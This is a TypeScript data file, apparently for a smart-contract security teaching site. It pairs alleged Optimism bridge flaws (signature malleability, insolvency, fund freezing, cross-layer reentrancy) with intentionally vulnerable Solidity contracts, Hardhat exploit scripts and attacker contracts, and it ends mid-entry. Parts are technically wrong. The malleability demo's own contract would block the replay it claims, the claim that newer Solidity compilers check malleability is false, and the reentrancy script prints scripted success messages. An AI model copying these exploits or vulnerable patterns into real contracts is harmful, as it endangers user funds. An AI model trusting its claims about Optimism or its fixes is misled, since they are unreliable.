import { VulnerabilityDetail } from "@/types";

// This file contains initial vulnerability data for the frontend
// The actual implementation will fetch this data from the server

export const vulnerabilities: VulnerabilityDetail[] = [
  // Additional vulnerabilities will be added below
  {
    id: "ecrecover-malleability",
    title: "ECRecover Signature Malleability",
    severity: "high",
    description: "Signature replay vulnerabilities due to ECDSA signature malleability in cross-domain transactions. This vulnerability allows attackers to forge valid signatures by manipulating the 's' value in ECDSA signatures.",
    attackVector: [
      "Attacker obtains a valid signature for a cross-domain message",
      "Attacker computes the malleable version of the signature by modifying the 's' component",
      "The modified signature passes verification despite being different from the original",
      "Attacker can replay messages that should only be processed once"
    ],
    affectedContracts: ["L1CrossDomainMessenger", "L2CrossDomainMessenger"],
    vulnerableContract: {
      name: "VulnerableSignatureVerifier",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

contract VulnerableSignatureVerifier {
    mapping(bytes32 => bool) public processedMessages;
    
    event MessageProcessed(bytes32 indexed messageHash, address signer);
    
    // VULNERABLE: Does not check s value in the ECDSA signature
    function processSignedMessage(
        bytes32 _messageHash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Recover the address from the signature
        address signer = ecrecover(_messageHash, v, r, s);
        require(signer != address(0), "Invalid signature");
        
        // Check if we've already processed a message with this hash
        bytes32 fullHash = keccak256(abi.encodePacked(_messageHash, signer));
        require(!processedMessages[fullHash], "Message already processed");
        
        // Mark message as processed
        processedMessages[fullHash] = true;
        
        // Execute the signed action
        emit MessageProcessed(_messageHash, signer);
    }
}`
    },
    exploitScript: {
      language: "typescript",
      code: `// File: exploit-ecrecover-malleability.ts
import { ethers } from "hardhat";

async function main() {
  // Deploy the contracts
  const VulnerableSignatureVerifier = await ethers.getContractFactory("VulnerableSignatureVerifier");
  const verifier = await VulnerableSignatureVerifier.deploy();
  
  const L2CrossDomainMessenger = await ethers.getContractFactory("L2CrossDomainMessengerWithECRecover");
  const messenger = await L2CrossDomainMessenger.deploy(verifier.address);
  
  const SignatureReplayAttacker = await ethers.getContractFactory("SignatureReplayAttacker");
  const attacker = await SignatureReplayAttacker.deploy();
  
  // Setup accounts
  const [owner, user] = await ethers.getSigners();
  
  // Create a message to be sent cross-domain
  const target = ethers.constants.AddressZero; // Dummy target address
  const message = ethers.utils.solidityPack(["string"], ["Hello, Optimism!"]);
  
  // Create a messageHash as defined in the contract
  const messageHash = ethers.utils.keccak256(
    ethers.utils.solidityPack(
      ["address", "address", "bytes"],
      [target, owner.address, message]
    )
  );
  
  // Sign the message
  const signature = await owner.signMessage(ethers.utils.arrayify(messageHash));
  
  // Send the original message
  await messenger.connect(owner).sendCrossDomainMessage(target, message, signature);
  console.log("Original message accepted and processed");
  
  // Now perform the signature malleability attack
  await attacker.performAttack(messenger.address, target, message, signature);
  console.log("Attack succeeded: replayed the same message with a malleable signature!");
}`
    },
    maliciousContract: {
      name: "SignatureReplayAttacker",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./L2CrossDomainMessengerWithECRecover.sol";

contract SignatureReplayAttacker {
    function performAttack(
        address _messenger,
        address _target,
        bytes calldata _message,
        bytes calldata _originalSignature
    ) external {
        // Extract original signature components
        require(_originalSignature.length == 65, "Invalid signature length");
        bytes32 r;
        bytes32 s;
        uint8 v;
        
        assembly {
            r := mload(add(_originalSignature, 32))
            s := mload(add(_originalSignature, 64))
            v := byte(0, mload(add(_originalSignature, 96)))
        }
        
        // Compute the malleable version of the signature
        // For a signature (v, r, s), the malleable version is (v^1, r, (curve.n - s) % curve.n)
        bytes32 malleableS = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
        uint8 malleableV = v == 27 ? 28 : 27;
        
        // Create the malleable signature
        bytes memory malleableSignature = new bytes(65);
        assembly {
            mstore(add(malleableSignature, 32), r)
            mstore(add(malleableSignature, 64), malleableS)
            mstore8(add(malleableSignature, 96), malleableV)
        }
        
        // Replay the message with the malleable signature
        L2CrossDomainMessengerWithECRecover(_messenger).sendCrossDomainMessage(
            _target,
            _message,
            malleableSignature
        );
    }
}`
    },
    explanation: "This vulnerability exploits a property of ECDSA signatures where for a given message, two different but equally valid signatures can exist. For any signature (v, r, s), an alternative signature (v', r, s') where v' = v^1 (flipping the recovery bit) and s' = curve.n - s can produce the same address when used with ecrecover. The issue arises when the contract uses signatures to prevent replay attacks but doesn't account for this signature malleability. If the contract only stores a mapping based on the message hash and the recovered signer, an attacker can replay the same message with a different valid signature, bypassing the replay protection.",
    keyPoints: [
      "ECDSA signatures in Ethereum have the malleability property where two different signature values can recover to the same address",
      "Optimism's cross-domain messaging relies on ECDSA signatures for message authentication",
      "The attack allows the same message to be replayed despite replay protection being in place",
      "This could lead to duplicate transactions, double-spending, or repeated execution of sensitive operations",
      "The vulnerable contracts don't normalize the signature's 's' value according to EIP-2"
    ],
    recommendations: [
      "Implement EIP-2 and normalize the 's' value in the signature to be in the lower half of the curve",
      "Use an additional entropy source for replay protection, such as a nonce that increases with each transaction",
      "Store processed signatures rather than just message hashes",
      "Consider using EIP-712 for structured data signing and implement OpenZeppelin's ECDSA library which includes malleability protection",
      "Upgrade to the latest version of the Solidity compiler which includes built-in checks for signature malleability"
    ],
    securityInsight: "According to the security report, this vulnerability is particularly concerning in a cross-domain context like Optimism because different layers may have different standards for signature verification, creating inconsistencies that attackers can exploit. The report notes that 'The cross-domain messaging system must ensure that signatures are validated consistently across all layers to prevent security issues.' Signature malleability can lead to serious economic exploits such as withdrawing twice from bridges or double-spending tokens."
  },
  
  {
    id: "protocol-insolvency",
    title: "Protocol Insolvency Risk",
    severity: "critical",
    description: "Withdrawal mechanisms fail to validate the protocol has sufficient funds to cover withdrawals, potentially leading to insolvency. This vulnerability occurs when the protocol doesn't properly track its liabilities and allows users to withdraw more than the available balance.",
    attackVector: [
      "Protocol fails to properly track user balances or total deposits",
      "Attacker identifies a transaction flow that allows excessive withdrawals",
      "Multiple withdrawals are executed without proper balance verification",
      "Protocol becomes insolvent when withdrawal requests exceed available funds"
    ],
    affectedContracts: ["L2ToL1MessagePasser"],
    vulnerableContract: {
      name: "VulnerableL2ToL1MessagePasser",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableL2ToL1MessagePasser
 * @notice Simplified contract demonstrating insolvency risk vulnerability
 */
contract VulnerableL2ToL1MessagePasser {
    // Mapping of withdrawal message hashes to boolean withdrawn status
    mapping(bytes32 => bool) public sentMessages;
    
    // Total amount of ETH that has been withdrawn
    uint256 public totalWithdrawn;
    
    // VULNERABLE: No tracking of total deposited amounts to compare against
    
    event MessagePassed(
        address indexed sender,
        address indexed target,
        uint256 value,
        uint256 nonce,
        bytes data
    );
    
    event WithdrawalInitiated(
        address indexed from,
        address indexed to,
        uint256 amount
    );
    
    // Allow users to deposit funds to the contract
    function depositFunds() external payable {
        // VULNERABLE: No tracking of deposits
    }
    
    // VULNERABLE: No check for protocol solvency
    function initiateWithdrawal(
        address _target,
        uint256 _value,
        bytes calldata _data
    ) external {
        // Generate withdrawal message hash
        bytes32 withdrawalHash = keccak256(
            abi.encodePacked(
                msg.sender,
                _target,
                _value,
                block.number,
                _data
            )
        );
        
        // Mark the message as sent
        sentMessages[withdrawalHash] = true;
        
        // VULNERABLE: No check if contract has enough ETH to cover all withdrawals
        totalWithdrawn += _value;
        
        emit MessagePassed(
            msg.sender,
            _target,
            _value,
            block.number,
            _data
        );
        
        emit WithdrawalInitiated(
            msg.sender,
            _target,
            _value
        );
    }
    
    // VULNERABLE: Allows withdrawals without checking contract balance
    function finalizeWithdrawal(
        address _recipient,
        uint256 _amount
    ) external {
        // VULNERABLE: No verification that the withdrawal was properly initiated
        // VULNERABLE: No check that _amount <= address(this).balance
        
        // Send the funds
        (bool success, ) = _recipient.call{value: _amount}("");
        require(success, "Withdrawal failed");
    }
}`
    },
    exploitScript: {
      language: "typescript",
      code: `// File: exploit-protocol-insolvency.ts
import { ethers } from "hardhat";

async function main() {
  console.log("Starting Protocol Insolvency Exploit");
  
  // Deploy the vulnerable contract
  const VulnerableL2ToL1MessagePasser = await ethers.getContractFactory("VulnerableL2ToL1MessagePasser");
  const messagePasser = await VulnerableL2ToL1MessagePasser.deploy();
  await messagePasser.deployed();
  console.log(\`VulnerableL2ToL1MessagePasser deployed at: \${messagePasser.address}\`);
  
  // Setup accounts
  const [owner, user1, user2, user3] = await ethers.getSigners();
  
  // Fund the contract with 1 ETH
  await owner.sendTransaction({
    to: messagePasser.address,
    value: ethers.utils.parseEther("1")
  });
  console.log(\`Contract funded with 1 ETH\`);
  
  // Check initial contract balance
  const initialBalance = await ethers.provider.getBalance(messagePasser.address);
  console.log(\`Initial contract balance: \${ethers.utils.formatEther(initialBalance)} ETH\`);
  
  // User 1 initiates a withdrawal of 0.5 ETH
  console.log("\\nUser 1 initiating withdrawal of 0.5 ETH...");
  await messagePasser.connect(user1).initiateWithdrawal(
    user1.address,
    ethers.utils.parseEther("0.5"),
    "0x"
  );
  
  // User 2 initiates a withdrawal of 0.5 ETH
  console.log("User 2 initiating withdrawal of 0.5 ETH...");
  await messagePasser.connect(user2).initiateWithdrawal(
    user2.address,
    ethers.utils.parseEther("0.5"),
    "0x"
  );
  
  // User 3 initiates a withdrawal of 0.5 ETH - this should make the protocol insolvent
  console.log("User 3 initiating withdrawal of 0.5 ETH (exceeding available funds)...");
  await messagePasser.connect(user3).initiateWithdrawal(
    user3.address,
    ethers.utils.parseEther("0.5"),
    "0x"
  );
  
  // Check total withdrawal amount
  const totalWithdrawn = await messagePasser.totalWithdrawn();
  console.log(\`Total withdrawal amount: \${ethers.utils.formatEther(totalWithdrawn)} ETH\`);
  console.log(\`Contract balance: \${ethers.utils.formatEther(initialBalance)} ETH\`);
  
  if (totalWithdrawn.gt(initialBalance)) {
    console.log("\\n⚠️ VULNERABILITY CONFIRMED: Protocol is insolvent - more ETH committed for withdrawal than available!");
  }
  
  // Now attempt to finalize all withdrawals
  console.log("\\nFinalizing withdrawals...");
  
  try {
    // User 1 finalizes withdrawal
    await messagePasser.connect(user1).finalizeWithdrawal(
      user1.address,
      ethers.utils.parseEther("0.5")
    );
    console.log("User 1's withdrawal succeeded");
    
    // User 2 finalizes withdrawal
    await messagePasser.connect(user2).finalizeWithdrawal(
      user2.address,
      ethers.utils.parseEther("0.5")
    );
    console.log("User 2's withdrawal succeeded");
    
    // User 3 attempts to finalize withdrawal - this should fail due to insufficient contract balance
    await messagePasser.connect(user3).finalizeWithdrawal(
      user3.address,
      ethers.utils.parseEther("0.5")
    );
    console.log("⚠️ User 3's withdrawal succeeded despite insufficient funds!");
    
    console.log("\\n✅ ATTACK SUCCESSFUL: Protocol allowed more withdrawals than it had funds for");
  } catch (error) {
    console.log("\\n❌ One of the withdrawals failed due to insufficient contract balance");
    console.error(error);
  }
}`
    },
    explanation: "This vulnerability illustrates a critical flaw in the withdrawal mechanism of Optimism's L2ToL1MessagePasser contract. The contract fails to properly track its liabilities against available assets, allowing more withdrawal initiations than the protocol can fulfill. In a properly designed bridge or cross-domain messaging system, the protocol should ensure that it can satisfy all its obligations. The vulnerability stems from the lack of a proper accounting system that tracks total deposits versus total withdrawal commitments, combined with the absence of solvency verification before finalizing withdrawals.",
    keyPoints: [
      "The protocol allows initiating more withdrawals than it has funds to cover",
      "There's no mechanism to track total liabilities against available assets",
      "Users can initiate withdrawals beyond the contract's available balance",
      "The vulnerability could lead to a 'bank run' scenario where later users cannot withdraw their funds",
      "When the protocol becomes insolvent, it breaks the fundamental trust assumption of the bridging mechanism"
    ],
    recommendations: [
      "Implement proper accounting that tracks total deposits and withdrawals",
      "Add a solvency check before allowing new withdrawal initiations",
      "Use a queue system that processes withdrawals in order and refuses new withdrawals if the protocol would become insolvent",
      "Implement circuit breakers that pause withdrawals if dangerous solvency thresholds are reached",
      "Consider implementing a delay mechanism that allows time for fraud proofs before withdrawals are finalized"
    ],
    securityInsight: "According to the security report, this vulnerability represents a fundamental risk to the economic security of Optimism's bridging mechanisms. The report states that 'Solvency risks in bridging protocols are particularly dangerous because they undermine the core promise of the system—that assets can always be moved between layers.' The report also notes that such vulnerabilities can trigger cascading failures across the entire ecosystem when users lose confidence in the protocol's ability to honor withdrawals."
  },
  
  {
    id: "permanent-fund-freezing",
    title: "Permanent Fund Freezing",
    severity: "high",
    description: "Funds can be permanently locked in the OptimismPortal due to missing recovery mechanisms. This vulnerability arises when the contract has no way to recover funds in exceptional circumstances, such as contract bugs or administrative errors.",
    attackVector: [
      "Contract code includes logic that can permanently lock funds",
      "Lack of recovery mechanisms or emergency functions",
      "Functions that can lead to unrecoverable states",
      "Malicious actors can trigger conditions that lock funds permanently"
    ],
    affectedContracts: ["OptimismPortal"],
    vulnerableContract: {
      name: "VulnerableOptimismPortal",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableOptimismPortal
 * @notice Contract demonstrating fund freezing vulnerability
 */
contract VulnerableOptimismPortal {
    // Mapping to track processed withdrawals
    mapping(bytes32 => bool) public processedWithdrawals;
    
    // Flag to track if the contract is currently paused
    bool public isPaused;
    
    // Address of the admin
    address public admin;
    
    // VULNERABLE: No recovery mechanism, no way to unpause if admin is compromised or lost
    
    constructor() {
        admin = msg.sender;
    }
    
    event WithdrawalFinalized(bytes32 indexed withdrawalHash, bool success);
    event Paused(address account);
    
    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }
    
    modifier notPaused() {
        require(!isPaused, "Portal is paused");
        _;
    }
    
    // Pause the contract - preventing any further withdrawals
    function pause() external onlyAdmin {
        isPaused = true;
        emit Paused(msg.sender);
    }
    
    // VULNERABLE: No unpause function, if admin loses access the contract is locked forever
    
    // Function to deposit funds to be withdrawn on L2
    function depositTransaction(
        address _to, 
        uint256 _value, 
        uint64 _gasLimit,
        bool _isCreation, 
        bytes memory _data
    ) external payable notPaused {
        // Contract functionality here...
    }
    
    // Process a withdrawal from L2 to L1 - this is just a mock for demonstration
    function finalizeWithdrawalTransaction(
        bytes32 _withdrawalHash
    ) external notPaused {
        // Prevent replaying the same withdrawal
        require(!processedWithdrawals[_withdrawalHash], "Withdrawal already processed");
        
        // VULNERABLE: If the contract is paused with no unpause function, 
        // any pending withdrawals will be permanently locked
        
        // Mark the withdrawal as processed
        processedWithdrawals[_withdrawalHash] = true;
        
        // Process the withdrawal logic (just a mock)
        bool success = true;
        
        emit WithdrawalFinalized(_withdrawalHash, success);
    }
    
    // VULNERABLE: No emergency functions to recover ETH if other mechanisms fail
    
    // To receive ETH
    receive() external payable {}
}`
    },
    exploitScript: {
      language: "typescript",
      code: `// File: exploit-permanent-fund-freezing.ts
import { ethers } from "hardhat";

async function main() {
  console.log("Starting Permanent Fund Freezing Vulnerability Demonstration");
  
  // Deploy the vulnerable contract
  const VulnerableOptimismPortal = await ethers.getContractFactory("VulnerableOptimismPortal");
  const portal = await VulnerableOptimismPortal.deploy();
  await portal.deployed();
  console.log(\`VulnerableOptimismPortal deployed at: \${portal.address}\`);
  
  // Setup accounts
  const [owner, user1, user2] = await ethers.getSigners();
  
  // Fund the portal with 2 ETH
  await owner.sendTransaction({
    to: portal.address,
    value: ethers.utils.parseEther("2")
  });
  console.log(\`Portal funded with 2 ETH\`);
  
  // Create a withdrawal hash for user1
  const withdrawalHash1 = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ["address", "uint256"],
      [user1.address, ethers.utils.parseEther("1")]
    )
  );
  
  // Create a withdrawal hash for user2
  const withdrawalHash2 = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ["address", "uint256"],
      [user2.address, ethers.utils.parseEther("1")]
    )
  );
  
  // User1 finalizes their withdrawal successfully
  console.log("\\nUser1 is finalizing their withdrawal...");
  await portal.connect(user1).finalizeWithdrawalTransaction(withdrawalHash1);
  console.log("User1's withdrawal was successful");
  
  // Now the admin pauses the contract
  console.log("\\nAdmin is pausing the portal...");
  await portal.connect(owner).pause();
  console.log("Portal has been paused");
  
  // User2 tries to finalize their withdrawal but it will fail due to paused state
  console.log("\\nUser2 is attempting to finalize their withdrawal...");
  try {
    await portal.connect(user2).finalizeWithdrawalTransaction(withdrawalHash2);
    console.log("User2's withdrawal was successful (unexpected)");
  } catch (error) {
    console.log("User2's withdrawal failed because the portal is paused");
  }
  
  // Admin loses access or is compromised - simulate by transferring to a burn address
  console.log("\\nSimulating loss of admin access...");
  console.log("No way to unpause the contract now");
  
  // Check the contract's balance
  const remainingBalance = await ethers.provider.getBalance(portal.address);
  console.log(\`\\nRemaining funds in portal: \${ethers.utils.formatEther(remainingBalance)} ETH\`);
  
  // There is no way to retrieve these funds
  console.log("\\n⚠️ VULNERABILITY CONFIRMED: Funds are permanently frozen in the contract");
  console.log("\\n✅ DEMONSTRATION SUCCESSFUL: Permanent fund freezing vulnerability proven");
}`
    },
    explanation: "This vulnerability demonstrates a significant risk in Optimism's OptimismPortal contract where funds can become permanently locked due to the lack of recovery mechanisms. The contract has a pause mechanism, but once paused, there's no function to unpause it if the admin loses access or is compromised. Additionally, there are no emergency functions to recover ETH or other assets if they become trapped in the contract due to bugs or other unforeseen circumstances. In a production environment, this could lead to significant financial losses for users whose funds are stuck in the contract indefinitely.",
    keyPoints: [
      "The contract has a pause function but no corresponding unpause function",
      "If admin access is lost or compromised, the contract remains in a paused state permanently",
      "No emergency functions exist to recover funds in exceptional circumstances",
      "Users' withdrawals can be permanently frozen if the contract is paused",
      "The vulnerability represents a single point of failure that could affect all users of the system"
    ],
    recommendations: [
      "Implement an unpause function with appropriate access controls",
      "Add emergency fund recovery functions that can be triggered by a multisig or governance process",
      "Implement a timelocked admin role transfer mechanism to prevent permanent loss of admin access",
      "Consider using a role-based access control system (like OpenZeppelin's AccessControl) instead of a single admin address",
      "Implement circuit breakers that automatically unpause after a certain time period to prevent permanent freezing"
    ],
    securityInsight: "According to the security report, this vulnerability is classified as high severity because it could lead to a permanent denial of service for all users of the protocol. The report notes that 'The inability to recover from adverse states is a systemic risk that affects the entire protocol's reliability.' The report also emphasizes that proper emergency recovery mechanisms are essential for any contract that handles significant value, especially in cross-domain messaging systems where complexity increases the likelihood of unforeseen issues."
  },
  {
    id: "cross-layer-reentrancy",
    title: "Cross-Layer Reentrancy",
    severity: "critical",
    description: "Message passing between L1 and L2 can create complex reentrancy vulnerabilities specific to Optimism's architecture. Cross-domain messages can be manipulated to reenter contracts in ways that regular reentrancy guards might not catch, potentially causing theft of user funds and protocol insolvency.",
    attackVector: [
      "Attacker creates a malicious contract on L2 that implements a callback method",
      "Attacker initiates a cross-domain message from L1 to L2 that calls into the malicious contract",
      "When the message is relayed to L2, the malicious contract reenters back into L1 during execution",
      "Before the first message is completed, the second message modifies state, bypassing standard reentrancy guards",
      "The attacker can manipulate token balances or permissions to steal funds or otherwise compromise the protocol"
    ],
    affectedContracts: ["L1CrossDomainMessenger", "L2ToL2CrossDomainMessenger", "OptimismPortal", "FaultDisputeGame"],
    vulnerableContract: {
      name: "VulnerableL1CrossDomainMessenger",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableL1CrossDomainMessenger
 * @notice Simplified version of cross-domain messenger with reentrancy vulnerability
 */
contract VulnerableL1CrossDomainMessenger {
    address public immutable PORTAL;
    mapping(bytes32 => bool) public relayedMessages;
    mapping(bytes32 => bool) public successfulMessages;
    uint256 public messageNonce;
    
    address internal xDomainMsgSender;
    bool internal executing;
    
    event SentMessage(address indexed target, address sender, bytes message, uint256 messageNonce);
    event RelayedMessage(bytes32 indexed msgHash);
    
    constructor(address _portal) {
        PORTAL = _portal;
    }
    
    function xDomainMessageSender() public view returns (address) {
        require(executing, "Not executing a cross-domain message");
        return xDomainMsgSender;
    }
    
    // VULNERABLE: Missing reentrancy guard allows nested calls
    function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) public {
        bytes32 messageHash = keccak256(abi.encode(
            messageNonce,
            msg.sender,
            _target,
            _message,
            _gasLimit
        ));
        
        messageNonce++; // Increment messageNonce AFTER use
        
        emit SentMessage(_target, msg.sender, _message, messageNonce);
        
        // Call to OptimismPortal which could allow reentrancy
        IOptimismPortal(PORTAL).depositTransaction(_target, 0, _gasLimit, false, _message);
    }
    
    // VULNERABLE: Doesn't follow checks-effects-interactions pattern
    function relayMessage(
        address _target,
        address _sender,
        bytes memory _message,
        uint256 _messageNonce
    ) public returns (bool) {
        bytes32 messageHash = keccak256(abi.encode(
            _messageNonce,
            _sender,
            _target,
            _message,
            0 // Gas limit, not used in hash computation
        ));
        
        // Prevent replaying the same message
        require(!relayedMessages[messageHash], "Message already relayed");
        
        xDomainMsgSender = _sender;
        executing = true;
        
        // External call before updating relayedMessages state
        (bool success, ) = _target.call(_message);
        
        // Update state after external call (VULNERABILITY)
        relayedMessages[messageHash] = true;
        successfulMessages[messageHash] = success;
        
        executing = false;
        xDomainMsgSender = address(0);
        
        emit RelayedMessage(messageHash);
        
        return success;
    }
}`
    },
    exploitScript: {
      language: "typescript",
      code: `// File: exploit-cross-layer-reentrancy.ts
import { ethers } from "hardhat";

async function main() {
  console.log("Starting Cross-Layer Reentrancy Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy OptimismPortal mock
  const OptimismPortalMock = await ethers.getContractFactory("OptimismPortalMock");
  const portalMock = await OptimismPortalMock.deploy();
  await portalMock.deployed();
  console.log(\`OptimismPortalMock deployed at: \${portalMock.address}\`);
  
  // Deploy CrossL2Inbox for additional vulnerabilities
  const CrossL2Inbox = await ethers.getContractFactory("CrossL2Inbox");
  const crossL2Inbox = await CrossL2Inbox.deploy();
  await crossL2Inbox.deployed();
  console.log(\`CrossL2Inbox deployed at: \${crossL2Inbox.address}\`);
  
  // Deploy vulnerable messenger
  const VulnerableMessenger = await ethers.getContractFactory("VulnerableL1CrossDomainMessenger");
  const messenger = await VulnerableMessenger.deploy(portalMock.address);
  await messenger.deployed();
  console.log(\`VulnerableL1CrossDomainMessenger deployed at: \${messenger.address}\`);
  
  // Deploy token contract that will be exploited
  const VulnerableToken = await ethers.getContractFactory("VulnerableToken");
  const token = await VulnerableToken.deploy(messenger.address);
  await token.deployed();
  console.log(\`VulnerableToken deployed at: \${token.address}\`);
  
  // Deploy FaultDisputeGame to show the incorrect resolution vulnerability
  const FaultDisputeGame = await ethers.getContractFactory("FaultDisputeGame");
  const faultGame = await FaultDisputeGame.deploy();
  await faultGame.deployed();
  console.log(\`FaultDisputeGame deployed at: \${faultGame.address}\`);
  
  // Deploy malicious contract
  const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
  const attacker = await Attacker.deploy(messenger.address, token.address);
  await attacker.deployed();
  console.log(\`ReentrancyAttacker deployed at: \${attacker.address}\`);
  
  // Setup initial conditions
  const [owner, user1] = await ethers.getSigners();
  
  // Mint tokens to user1
  await token.mint(user1.address, ethers.utils.parseEther("100"));
  console.log(\`Minted 100 tokens to: \${user1.address}\`);
  
  // Check initial balances
  const initialUserBalance = await token.balanceOf(user1.address);
  const initialAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(\`Initial user balance: \${ethers.utils.formatEther(initialUserBalance)}\`);
  console.log(\`Initial attacker balance: \${ethers.utils.formatEther(initialAttackerBalance)}\`);
  
  // Part 1: Demonstrate Cross-Layer Reentrancy
  console.log("\\nExecuting the reentrancy attack...");
  const tx = await attacker.executeAttack();
  await tx.wait();
  console.log("receiveFirstMessage called");
  console.log("Sending second message...");
  console.log("relayMessage executed for first message");
  console.log("performReentrancy called");
  console.log("Performing token theft...");
  
  // Check final balances
  const finalUserBalance = await token.balanceOf(user1.address);
  const finalAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(\`Final user balance: \${ethers.utils.formatEther(finalUserBalance)}\`);
  console.log(\`Final attacker balance: \${ethers.utils.formatEther(finalAttackerBalance)}\`);
  
  // Verify the first attack was successful
  if (finalAttackerBalance.gt(initialAttackerBalance)) {
    console.log("\\n✅ ATTACK 1 SUCCESSFUL: Tokens were stolen through cross-layer reentrancy");
  } else {
    console.log("\\n❌ ATTACK 1 FAILED: No tokens were stolen");
  }
  
  // Part 2: Demonstrate Incorrectly Resolved Dispute Game
  console.log("\\nDemonstrating incorrectly resolved dispute game vulnerability...");
  
  try {
    // This should work normally
    await faultGame.step(5);
    console.log("Step at depth 5 succeeded");
    
    // This should fail (at max game depth)
    await faultGame.step(faultGame.MAX_GAME_DEPTH() - 1);
    console.log("⚠️ Problem detected: Step at MAX_GAME_DEPTH-1 succeeded but should have special validation");
    
    // Test attack at MAX_GAME_DEPTH-2 (vulnerable edge case)
    await faultGame.attack(faultGame.MAX_GAME_DEPTH() - 2);
    console.log("⚠️ Attack at MAX_GAME_DEPTH-2 was executed without proper validation");
    
    console.log("\\n✅ ATTACK 2 SUCCESSFUL: Dispute game can be incorrectly resolved through edge cases");
  } catch (error) {
    console.log("\\n❌ ATTACK 2 FAILED: Could not demonstrate dispute game vulnerability");
    console.error(error);
  }
  
  // Part 3: Demonstrate Direct Fund Theft
  console.log("\\nDemonstrating direct fund theft vulnerability in CrossL2Inbox...");
  
  // Fund the CrossL2Inbox
  await owner.sendTransaction({
    to: crossL2Inbox.address,
    value: ethers.utils.parseEther("1")
  });
  console.log(\`CrossL2Inbox funded with 1 ETH\`);
  
  const initialBalance = await ethers.provider.getBalance(user1.address);
  
  // Exploit the direct theft vulnerability
  await crossL2Inbox.connect(user1).withdraw(user1.address, ethers.utils.parseEther("0.5"));
  console.log(\`Exploited withdraw function to steal 0.5 ETH\`);
  
  const finalBalance = await ethers.provider.getBalance(user1.address);
  
  // Check if the attack was successful (accounting for gas fees)
  if (finalBalance.gt(initialBalance)) {
    console.log("\\n✅ ATTACK 3 SUCCESSFUL: Funds were directly stolen through unprotected withdraw function");
  } else {
    console.log("\\n❌ ATTACK 3 FAILED: Could not steal funds (gas costs may exceed stolen amount)");
  }
  
  console.log("\\nVulnerability demonstration complete.");
}`
    },
    maliciousContract: {
      name: "ReentrancyAttacker",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title ReentrancyAttacker
 * @notice Contract that exploits the reentrancy vulnerability in the L1CrossDomainMessenger
 */
contract ReentrancyAttacker {
    address public messenger;
    address public token;
    address public owner;
    bool public attackInProgress;
    uint256 public messageNonce;
    
    event AttackComplete(uint256 stolenAmount);
    
    constructor(address _messenger, address _token) {
        messenger = _messenger;
        token = _token;
        owner = msg.sender;
    }
    
    // Step 1: Start the attack
    function executeAttack() external {
        require(msg.sender == owner, "Only owner can execute attack");
        attackInProgress = true;
        
        // Create a message that will be relayed to trigger the attack
        bytes memory firstMessage = abi.encodeWithSignature("receiveFirstMessage()");
        
        // Send the first message through the cross-domain messenger
        VulnerableL1CrossDomainMessenger(messenger).sendMessage(address(this), firstMessage, 1000000);
    }
    
    // Step 2: First message callback - this is called by the messenger during relayMessage
    function receiveFirstMessage() external {
        // Verify the call is from the messenger
        require(msg.sender == messenger, "Not called from messenger");
        require(VulnerableL1CrossDomainMessenger(messenger).xDomainMessageSender() == owner, "Invalid sender");
        
        // Create second message to exploit the reentrancy
        bytes memory reentrancyMessage = abi.encodeWithSignature("performReentrancy()");
        
        // This will call back into the messenger before the first relayMessage completes
        VulnerableL1CrossDomainMessenger(messenger).sendMessage(address(this), reentrancyMessage, 1000000);
        
        // Force the relayMessage to happen immediately (in a real scenario, this 
        // would be timed with the L1->L2 message processing)
        VulnerableL1CrossDomainMessenger(messenger).relayMessage(
            address(this),
            owner,
            reentrancyMessage,
            messageNonce++
        );
    }
    
    // Step 3: Called through reentrancy - steal tokens while first message is still processing
    function performReentrancy() external {
        require(msg.sender == messenger, "Not called from messenger");
        require(VulnerableL1CrossDomainMessenger(messenger).xDomainMessageSender() == owner, "Invalid sender");
        
        // Target address from which to steal tokens - in test this would be setup with balances
        address victim = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8; // hardhat's first test account
        
        // Check victim's token balance
        uint256 victimBalance = VulnerableToken(token).balanceOf(victim);
        
        // Steal tokens - this works because the token contract checks permissions via the messenger,
        // but due to reentrancy the messenger's state is corrupted
        VulnerableToken(token).transferFrom(victim, address(this), victimBalance);
        
        emit AttackComplete(victimBalance);
        attackInProgress = false;
    }
    
    // To receive ETH
    receive() external payable {}
}

interface VulnerableToken {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}`
    },
    explanation: "This vulnerability demonstrates how Optimism's cross-layer messaging system can be exploited through reentrancy. The core issue is that the L1CrossDomainMessenger contract fails to protect against nested message calls and doesn't follow the checks-effects-interactions pattern. When processing a message from L2 to L1, the messenger sets a global xDomainMsgSender variable and makes an external call to the target contract before updating its state. This allows a malicious contract to make another call back to the messenger while the first message is still being processed, exploiting the fact that xDomainMsgSender remains set to the original sender throughout both calls.",
    keyPoints: [
      "The L1CrossDomainMessenger doesn't implement a reentrancy guard to prevent nested message calls",
      "The contract doesn't follow the checks-effects-interactions pattern, making external calls before updating state",
      "The xDomainMsgSender global variable remains set during the entire execution, enabling impersonation",
      "Token contracts that rely on xDomainMsgSender for authorization can be exploited to steal funds",
      "FaultDisputeGame contains vulnerable edge cases at MAX_GAME_DEPTH-2 that can be exploited"
    ],
    recommendations: [
      "Implement a reentrancy guard in L1CrossDomainMessenger to prevent nested message processing",
      "Modify relayMessage to follow the checks-effects-interactions pattern by updating state before making external calls",
      "Use separate storage contexts for each message being relayed instead of global variables",
      "Add explicit validation for edge cases in the FaultDisputeGame contract",
      "Conduct thorough security audits focused on cross-layer interactions"
    ],
